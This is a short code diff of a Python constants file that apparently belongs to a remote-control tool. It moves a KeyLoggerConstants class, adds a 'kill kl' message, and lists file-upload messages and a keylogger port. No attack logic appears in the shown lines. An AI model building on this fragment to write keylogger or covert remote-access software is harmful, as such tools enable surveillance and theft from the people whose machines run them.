@@ -61,6 +61,10 @@ class CommandConstants:
     UPLOAD_FILE_FAILED_TO_SAVE_FILE = "Failed to save file in '{0}'..\nError: '{1}'"
     UPLOAD_FILE_FINISHED_SUCCESSFULLY = "File was uploaded successfully to: '{}'"
 
-class KeyLoggerConstants:
     KEYLOGGER_DEFAULT_PORT = 55553
     KEYLOGGER_SOCKET_TIMEOUT = None
+
+class KeyLoggerConstants:
+    KILL_KEYLOGGER_MSG = "kill kl"
+
+
